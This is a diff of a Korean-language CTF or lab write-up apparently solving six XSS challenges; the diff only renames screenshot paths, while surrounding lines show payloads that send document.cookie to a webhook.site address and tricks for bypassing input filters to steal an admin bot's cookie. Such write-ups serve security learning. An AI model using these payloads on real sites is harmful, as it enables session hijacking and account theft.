@@ -25,7 +25,7 @@ header:
 
 공격 페이로드는 해당 WEBHOOK 주소로 관리자의 쿠키 값을 전송하도록 작성할 것이다.
 
-![테이블 구조](/assets/screenshots/stored-reflected-xss/webhook.png)
+![테이블 구조](/assets/web-screenshots/stored-reflected-xss/webhook.png)
 
 - 위 화면에서 **파란색으로 표시된 부분**은 페이로드에 사용할 webhook 주소이며,
 **빨간색으로 표시된 부분**은 관리자가 접속했을 때 전송되는 쿠키 값이 실시간으로 기록되는 영역이다.
@@ -38,7 +38,7 @@ header:
 
 게시글 작성 기능 중 **제목(title)** 입력란에 XSS 취약점이 존재함을 확인하였다.
 
-![xss1 스크립트](/assets/screenshots/stored-reflected-xss/xss1_script.png)
+![xss1 스크립트](/assets/web-screenshots/stored-reflected-xss/xss1_script.png)
 
 `<script>` 태그가 필터링 없이 그대로 반영되어, **관리자가 해당 페이지를 열람**할 경우, 악성 스크립트가 실행되는 구조이다.
 
@@ -46,7 +46,7 @@ header:
 
 - **Payload 삽입:**
 
-![xss1 페이로드 삽입](/assets/screenshots/stored-reflected-xss/xss1_payload.png)
+![xss1 페이로드 삽입](/assets/web-screenshots/stored-reflected-xss/xss1_payload.png)
 
 ```html
 <script>new Image().src='https://webhook.site/00da818a-c861-444c-8a3a-c50bd3e46a01?cookie='+document.cookie</script>
@@ -54,17 +54,17 @@ header:
 
 - **게시물 클릭 후 Webhook으로 쿠키 전송**
 
-![xss1 쿠키 탈취](/assets/screenshots/stored-reflected-xss/xss1_cookie.png)
+![xss1 쿠키 탈취](/assets/web-screenshots/stored-reflected-xss/xss1_cookie.png)
 
 이제 관리자가 해당 게시글을 열람하면 삽입된 JavaScript가 실행되고, `document.cookie` 값을 포함한 요청이 webhook 서버로 전송된다.
 
 관리자 봇이 스크립트가 들어간 URL을 클릭하게 만들어, 쿠키를 외부로 보내도록 하겠다.
 
-![xss1 관리자 봇 접속 완료](/assets/screenshots/stored-reflected-xss/xss1_admin_access.png)
+![xss1 관리자 봇 접속 완료](/assets/web-screenshots/stored-reflected-xss/xss1_admin_access.png)
 
 관리자 봇에게 XSS가 삽입된 URL을 전달하여 요청을 유도하였고, 이후 Webhook에서 쿠키가 정상적으로 수신되었는지 확인한다.
 
-![xss1 관리자 봇 접속 완료](/assets/screenshots/stored-reflected-xss/xss1_flag.png)
+![xss1 관리자 봇 접속 완료](/assets/web-screenshots/stored-reflected-xss/xss1_flag.png)
 
 이렇게 해서 **관리자 쿠키에 포함된 플래그를 탈취하는 데 성공**하였다.
 
@@ -82,11 +82,11 @@ header:
 
 아래는 해당 페이로드 입력 후, 브라우저에서 `alert()` 창이 실행된 화면이다.
 
-![xss2 스크립트](/assets/screenshots/stored-reflected-xss/xss2_search_script.png)
+![xss2 스크립트](/assets/web-screenshots/stored-reflected-xss/xss2_search_script.png)
 
 이를 이용하여 관리자의 쿠키를 탈취할 수 있다.
 
-![xss2 payload](/assets/screenshots/stored-reflected-xss/xss2_payload.png)
+![xss2 payload](/assets/web-screenshots/stored-reflected-xss/xss2_payload.png)
 
 ```js
 ');new Image().src='https://webhook.site/00da818a-c861-444c-8a3a-c50bd3e46a01?cookie='+document.cookie//
@@ -96,7 +96,7 @@ header:
 
 > **결과:**
 
-![xss2 payload](/assets/screenshots/stored-reflected-xss/xss2_me_cookie.png)
+![xss2 payload](/assets/web-screenshots/stored-reflected-xss/xss2_me_cookie.png)
 
 쿠키 값이 정상적으로 수신되는 것을 확인하였다.
 
@@ -104,11 +104,11 @@ header:
 
 **관리자 봇을 통하여 쿠키 값 전송**
 
-![xss2 payload](/assets/screenshots/stored-reflected-xss/xss2_admin_access.png)
+![xss2 payload](/assets/web-screenshots/stored-reflected-xss/xss2_admin_access.png)
 
 > **결과:**
 
-![xss2 flag](/assets/screenshots/stored-reflected-xss/xss2_flag.png)
+![xss2 flag](/assets/web-screenshots/stored-reflected-xss/xss2_flag.png)
 
 **관리자 쿠키에 포함된 플래그를 탈취하는 데 성공**하였다.
 
@@ -118,7 +118,7 @@ header:
 
 `mypage.php`의 `user` 파라미터에 페이로드를 삽입한 결과, 아래와 같이 `alert` 창이 실행되는 것을 확인하였다.
 
-![xss2 flag](/assets/screenshots/stored-reflected-xss/xss3_script.png)
+![xss2 flag](/assets/web-screenshots/stored-reflected-xss/xss3_script.png)
 
 ```js
 123"/><script>alert(1)</script>
@@ -134,11 +134,11 @@ header:
 
 위 페이로드를 URL에 포함하여, **관리자 봇이 해당 URL에 접속하도록 유도**할 것이다.
 
-![xss3 payload](/assets/screenshots/stored-reflected-xss/xss3_admin_access.png)
+![xss3 payload](/assets/web-screenshots/stored-reflected-xss/xss3_admin_access.png)
 
 > **결과:**
 
-![xss3 flag](/assets/screenshots/stored-reflected-xss/xss3_flag.png)
+![xss3 flag](/assets/web-screenshots/stored-reflected-xss/xss3_flag.png)
 
 최종적으로, **관리자 쿠키에 포함된 플래그를 탈취하는 데 성공**하였다.
 
@@ -150,15 +150,15 @@ header:
 
 그러나 대문자 태그인 `<SCRIPT>`와 `prompt()` 함수를 이용한 페이로드는 우회가 가능하였다.
 
-![xss4 script](/assets/screenshots/stored-reflected-xss/xss4_script.png)
+![xss4 script](/assets/web-screenshots/stored-reflected-xss/xss4_script.png)
 
 해당 페이로드를 통해 XSS가 정상적으로 **실행되는 것을 확인**할 수 있었다.
 
-![xss4 teigger](/assets/screenshots/stored-reflected-xss/xss4_trigger.png)
+![xss4 teigger](/assets/web-screenshots/stored-reflected-xss/xss4_trigger.png)
 
 **우선, 페이로드가 정상적으로 동작하는지 확인하기 위해 본인의 쿠키 값을 webhook을 통해 전송하는 테스트를 진행하였다.**
 
-![xss4 payload](/assets/screenshots/stored-reflected-xss/xss4_payload.png)
+![xss4 payload](/assets/web-screenshots/stored-reflected-xss/xss4_payload.png)
 
 ```html
 <SCRIPT>new Image().src="https://webhook.site/00da818a-c861-444c-8a3a-c50bd3e46a01?cookie="+document.cookie</SCRIPT>
@@ -166,11 +166,11 @@ header:
 
 위와 같이 페이로드를 작성한 후, 해당 URL에 직접 접근하여 스크립트 실행 여부를 확인하였다.
 
-![xss4 access](/assets/screenshots/stored-reflected-xss/xss4_access.png)
+![xss4 access](/assets/web-screenshots/stored-reflected-xss/xss4_access.png)
 
 페이로드가 정상적으로 동작함을 확인하였다. 이제 이를 이용해 **관리자의 쿠키 값을 탈취**할 것이다.
 
-![xss4 admin access](/assets/screenshots/stored-reflected-xss/xss4_admin_access.png)
+![xss4 admin access](/assets/web-screenshots/stored-reflected-xss/xss4_admin_access.png)
 
 악성 스크립트가 저장된 게시글에 대한 URL을 관리자 봇에게 전달하였다.
 
@@ -178,7 +178,7 @@ header:
 
 > **결과:**
 
-![xss4 flag](/assets/screenshots/stored-reflected-xss/xss4_flag.png)
+![xss4 flag](/assets/web-screenshots/stored-reflected-xss/xss4_flag.png)
 
 이렇게 **관리자 쿠키를 탈취하는 데 성공**하였다.
 
@@ -186,21 +186,21 @@ header:
 
 ## XSS 5
 
-![xss5 burp suite](/assets/screenshots/stored-reflected-xss/xss5_burp_suite.png)
+![xss5 burp suite](/assets/web-screenshots/stored-reflected-xss/xss5_burp_suite.png)
 
 Burp Suite를 이용해 트래픽을 확인한 결과, **입력값에서 `<`, `>` 문자가 필터링되어 HTML 태그가 escape 처리되는 것을 확인**할 수 있었다.
 
 하지만 이 필터링은 **브라우저에서 JavaScript가 실행되는 조건에서만 동작**하므로, 수동 접근을 통해 **JavaScript를 비활성화한 상태**로 요청을 전달하면 실제 HTML에 스크립트가 삽입될 수 있다.
 
-![xss5 create](/assets/screenshots/stored-reflected-xss/xss5_create.png)
+![xss5 create](/assets/web-screenshots/stored-reflected-xss/xss5_create.png)
 
 위는 게시글 작성 직전의 상태이다.
 
-![xss5 js setting](/assets/screenshots/stored-reflected-xss/xss5_js_setting.png)
+![xss5 js setting](/assets/web-screenshots/stored-reflected-xss/xss5_js_setting.png)
 
 이후, `javascript.enabled` 값을 `false`로 설정한 뒤 게시글 작성 페이지로 돌아와 새로고침을 수행하고, 게시글을 등록하였다.
 
-![xss5 script](/assets/screenshots/stored-reflected-xss/xss5_script.png)
+![xss5 script](/assets/web-screenshots/stored-reflected-xss/xss5_script.png)
 
 이후 해당 게시물을 클릭하면, 삽입한 `alert(1)` 스크립트가 실행되는 것을 확인할 수 있었다.
 
@@ -210,7 +210,7 @@ Burp Suite를 이용해 트래픽을 확인한 결과, **입력값에서 `<`, `>
 
 `javascript.enabled` 값을 `false`로 설정한 뒤 페이로드를 작성한 후 게시글을 등록하였다.
 
-![xss5 payload](/assets/screenshots/stored-reflected-xss/xss5_payload.png)
+![xss5 payload](/assets/web-screenshots/stored-reflected-xss/xss5_payload.png)
 
 ```html
 <script>new Image().src="https://webhook.site/00da818a-c861-444c-8a3a-c50bd3e46a01"+document.cookie</script>
@@ -218,15 +218,15 @@ Burp Suite를 이용해 트래픽을 확인한 결과, **입력값에서 `<`, `>
 
 > **게시글 클릭 후 결과:**
 
-![xss5 access](/assets/screenshots/stored-reflected-xss/xss5_access.png)
+![xss5 access](/assets/web-screenshots/stored-reflected-xss/xss5_access.png)
 
 페이로드가 정상적으로 동작함을 확인하였고, 이를 이용하여 **관리자의 쿠키 값을 탈취**할 것이다.
 
-![xss5 admin access](/assets/screenshots/stored-reflected-xss/xss5_admin_access.png)
+![xss5 admin access](/assets/web-screenshots/stored-reflected-xss/xss5_admin_access.png)
 
 > **결과:**
 
-![xss5 flag](/assets/screenshots/stored-reflected-xss/xss5_flag.png)
+![xss5 flag](/assets/web-screenshots/stored-reflected-xss/xss5_flag.png)
 
 최종적으로, **관리자 쿠키에 포함된 플래그를 탈취하는 데 성공**하였다.
 
@@ -234,13 +234,13 @@ Burp Suite를 이용해 트래픽을 확인한 결과, **입력값에서 `<`, `>
 
 ## XSS 6
 
-![xss6 id](/assets/screenshots/stored-reflected-xss/xss6_id.png)
+![xss6 id](/assets/web-screenshots/stored-reflected-xss/xss6_id.png)
 
 위와 같이 로그인 시 **아이디를 입력하면 alert 창을 통해 입력한 값이 그대로 출력되는 것을 확인**할 수 있다.
 
 따라서 `ID 입력` 칸에 XSS payload를 넣는 방식으로 **스크립트 실행 여부를 테스트**해보았다.
 
-![xss6 alert](/assets/screenshots/stored-reflected-xss/xss6_alert.png)
+![xss6 alert](/assets/web-screenshots/stored-reflected-xss/xss6_alert.png)
 
 ```js
 ]');alert('취약')//
@@ -260,20 +260,20 @@ Burp Suite를 이용해 트래픽을 확인한 결과, **입력값에서 `<`, `>
 
 **위와 같이 페이로드를 작성한 후, 실행 결과:**
 
-![xss6 redirect](/assets/screenshots/stored-reflected-xss/xss6_redirect.png)
+![xss6 redirect](/assets/web-screenshots/stored-reflected-xss/xss6_redirect.png)
 
 쿠키 전송이 완료되면, 페이로드 내 `location.href`에 의해 사용자는 지정된 페이지로 리다이렉트된다.
 
-![xss6 access](/assets/screenshots/stored-reflected-xss/xss6_access.png)
+![xss6 access](/assets/web-screenshots/stored-reflected-xss/xss6_access.png)
 
 이후, 위와 같이 쿠키 값이 정상적으로 전송된 것을 확인할 수 있었다.
 
 이제 이를 이용해 **관리자의 쿠키 값을 탈취**할 것이다.
 
-![xss6 admin access](/assets/screenshots/stored-reflected-xss/xss6_admin_access.png)
+![xss6 admin access](/assets/web-screenshots/stored-reflected-xss/xss6_admin_access.png)
 
 > **결과:**
 
-![xss6 flag](/assets/screenshots/stored-reflected-xss/xss6_flag.png)
+![xss6 flag](/assets/web-screenshots/stored-reflected-xss/xss6_flag.png)
 
 **이렇게 마지막 문제의 플래그까지 얻을 수 있었다.**
